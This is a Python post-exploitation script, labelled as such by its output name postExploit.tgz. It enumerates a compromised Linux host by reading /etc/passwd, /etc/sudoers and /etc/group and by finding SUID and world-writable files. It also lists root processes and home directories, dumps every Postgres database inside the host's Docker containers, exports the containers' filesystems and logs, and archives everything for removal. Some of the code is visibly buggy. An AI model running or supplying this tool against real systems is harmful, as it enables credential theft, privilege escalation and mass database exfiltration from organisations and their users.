#!/usr/bin/python3.5
import os
import multiprocessing 
import subprocess

fileLocation = "/tmp/"
sshTarget = ""

#Files
linuxEnvFile = "/tmp/linuxEnviron.dump"
filesPermisisons = "/tmp/filesPermisisons.dump"
userInfoFile = "/tmp/userInfo.dump"
dockerInfo = "/tmp/dockerInfo.dump"


def header(text):
	return """
------------------------------------------
------------------------------------------
%s
------------------------------------------
""" % (text)

def runRetun(call):
	results = ""
	p = subprocess.Popen([call], stdout=subprocess.PIPE, shell=True)
	(results, err) = p.communicate()
	return results.decode("utf-8") 

#Linux environ
def linuxEnum():
	file = open(linuxEnvFile, 'w')
	#Linux version

	file.write( header("Linux Environment"))

	file.write( runRetun("/bin/cat /etc/issue") )
	file.write("\n\n")	
	file.write( runRetun("/bin/cat /etc/*-release") )

	file.write( header("Kernel Info"))	
	file.write( runRetun("/bin/uname -ar") )
	file.write("\n\n")

	file.write( header("Network Interfaces"))
	file.write( runRetun("/bin/cat /etc/sysconfig/network") )
	file.write("\n\n")	
	file.write( runRetun("/bin/cat /etc/resolv.conf") )
		
	file.write( header("Debian Packages"))	
	file.write( runRetun("dpkg -l") )
	file.write("\n\n")

	file.write("\n\n")
	file.close()



	#files and Permissions
	file = open(filesPermisisons, 'w')
	file.write( header("File System Info And Permissions"))
	file.write( runRetun("/bin/df -h") )
	file.write("\n\n")	

	file.write( header("Mounted File Systems with Pretty Output"))
	file.write( runRetun(" mount | column -t") )
	file.write("\n\n")

	file.write( header("/etc/passwd Contents"))
	file.write( runRetun("/bin/cat /etc/passwd") )
	file.write("\n\n")

	file.write( header(" /etc/group File Contents"))
	file.write( runRetun("/bin/cat /etc/group") )
	file.write("\n\n")

	file.write( header(" /etc/sudoers File Contents"))
	file.write( runRetun("/bin/cat /etc/sudoers") )
	file.write("\n\n")

	file.write( header("Sticky Bit Files"))
	file.write( runRetun("/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null") )
	file.write("\n\n")

	file.write( header("World Writable Directories"))
	file.write( runRetun("/usr/bin/find / -perm -222 -type d 2>/dev/null") )
	file.write("\n\n")

	file.write( header("World Writable Files"))
	file.write( runRetun("/usr/bin/find / -type f -perm 0777 2>/dev/null") )
	file.write("\n\n")

	file.write( header("Files Owned by Current User"))
	file.write( runRetun("/usr/bin/find / -user $(whoami) 2>/dev/null") )
	file.write("\n\n")

	file.write( header("/home and /root Permissions"))
	file.write( runRetun("/bin/ls -ahlR /home/") )
	file.write("\n\n")
	file.write( runRetun("/bin/ls -ahlR /root/") )
	file.write("\n\n")


	file.write( header("Logged on Users"))
	file.write( runRetun("/usr/bin/last") )
	file.write("\n\n")

	file.write( header("Processes Running as root"))
	file.write( runRetun("/bin/ps -ef | /bin/grep root") )
	file.write("\n\n")

	file.write( header("Debian Services"))
	file.write( runRetun("service --status-all") )
	file.write("\n\n")

	file.write( header("Installed Packages for RHEL / Debian Based Systems"))
	file.write( runRetun("/usr/bin/dpkg -l") )
	file.write("\n\n")
	file.write( runRetun("/usr/bin/rpm -qa") )
	file.write("\n\n")

	file.write( header("CentOS / RHEL Services that start at Boot"))
	file.write( runRetun("chkconfig --list | grep $(runlevel | awk '{ print $2}'):on") )
	file.write("\n\n")


	file.write( header("List of init Scripts aka System Services"))
	file.write( runRetun("ls /etc/init.d/") )
	file.write("\n\n")
	file.close()


# file.write( header("List Postgres Schemas for Host"))
# # Alternativley this SQL statement will work as well
# # select schema_name from information_schema.schemata

# postgresCommand = "psql template1 -c '\l'|tail -n+4|cut -d'|' -f 1|sed -e '/^ *$/d'|sed -e '$d'"
# p = subprocess.Popen(['sudo su postgres -c "'+postgresCommand+'"'], stdout=subprocess.PIPE, shell=True)
# (postgresTables, err) = p.communicate()
# postgresTables = postgresTables.decode("utf-8")
# file.write(postgresTables)

# postgresTables = postgresTables.split("\n")


#for t in postgresTables:
#	p = subprocess.Popen(['sudo su postgres -c "pg_dump '+ t.strip()+' > /tmp/'+ t.strip()+'_dataBase.dump "'], stdout=subprocess.PIPE, shell=True)
#	(postgresResults, err) = p.communicate()
#	postgresResults = postgresResults.decode("utf-8")


# file.write("\n\n")
# file.close()


# Docker command 
#   docker exec <dockerId> <command>


file = open(dockerInfo, 'w')

file.write( header("Docker Info"))
file.write( runRetun("docker version") )
file.write("\n\n")
file.write( runRetun("docker info") )
file.write("\n\n")

# file = open(dockerInfo, 'a')
file.write( header("Docker Stats"))
file.write( runRetun('docker stats --all --no-stream --format "table {{.ID}}\t{{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}\t{{BlockIO}}\t{{.PIDs}}"') )
file.write("\n\n")

file.write( header("List All docker containers"))
file.write( runRetun("docker container ls --all") )
file.write("\n\n")

file.write( header("List All docker images"))
file.write( runRetun("docker images --all") )
file.write("\n\n")

file.write( header("List of docker container Ids"))
p = subprocess.Popen(['docker ps -aq'], stdout=subprocess.PIPE, shell=True)
(dockerIds, err) = p.communicate()
dockerIds = dockerIds.decode("utf-8")
file.write(dockerIds)
file.write("\n\n")

file.write( header("List of docker Network info"))
p = subprocess.Popen(['docker ps -a --no-trunc'], stdout=subprocess.PIPE, shell=True)
(dockerNets, err) = p.communicate()
file.write(dockerNets.decode("utf-8"))

dockerIds = dockerIds.split("\n")

postgresServerArr = []
for c in dockerIds:
	#postgresCommand = "psql template1 -c '\l'|tail -n+4|cut -d'|' -f 1|sed -e '/^ *$/d'|sed -e '$d'"
	print('docker exec '+ c +' pg_dumpall -c -U postgres > /tmp/postgres_'+c+'.sql.dump')
	p = subprocess.Popen(['docker exec '+ c +' pg_dumpall -c -U postgres > /tmp/postgres_'+c+'.sql.dump'], stdout=subprocess.PIPE, shell=True)
	(postgresServers, err) = p.communicate()
	file.write(postgresServers.decode("utf-8"))

	postgresServerArr = postgresServers.decode("utf-8").split("\n")

file.write( header("Docker Logs"))

#def postgresDockerDump(dockerId, postgresServer):
#	print ( dockerId +'\n')
#	postgresCommand = "psql template1 -c '\l'|tail -n+4|cut -d'|' -f 1|sed -e '/^ *$/d'|sed -e '$d'"
#	p = subprocess.Popen(['docker exec '+ dockerId +' sudo su postgres -c "'+postgresCommand+'"'], stdout=subprocess.PIPE, shell=True)
#	(postgresTables, err) = p.communicate()
#	postgresTables = postgresTables.decode("utf-8")
#	for t in postgresTables:
#		p = subprocess.Popen(['docker exec '+ dockerId +' sudo su postgres -c "pg_dump '+ postgresServer.strip()+' > /tmp/'+ t.strip()+'_dataBase.dump "'], stdout=subprocess.PIPE, shell=True)
#		(postgresTables, err) = p.communicate()
#		print(postgresTables.decode("utf-8"))
#		print(err.decode("utf-8"))
#This threads well as each thread makes it's own file

#ctx = multiprocessing.get_context('spawn')
#q = ctx.Queue()

#for dIds in dockerIds:
#	for pServer in postgresServerArr:
#		postgresDockerDump(dIds, pServer)
		#p = ctx.Process(target=postgresDockerDump, args=(dIds, pServer,)).start()

#p.join()	
		

def dockerExport(dockerId):
	runRetun("docker export "+ dockerId + " > /tmp/dockerExportOf_"+ c +".tar.dump") 
	p = subprocess.Popen(['docker logs '+ dockerId ], stdout=subprocess.PIPE, shell=True)
	(dockLogs, err) = p.communicate()
	dockLogs = dockLogs.decode("utf-8")
	return dockLogs

dockLogs = ""
for c in dockerIds:
	dockLogs = dockLogs + '\n\n'+ dockerExport(c)	

file.write(dockLogs)
file.write("\n\n")
	#for t in postgresServerArr:
		


file.close()

#File building complete, zip up and ship out
runRetun("tar -czvf /tmp/postExploit.tgz /tmp/*.dump")

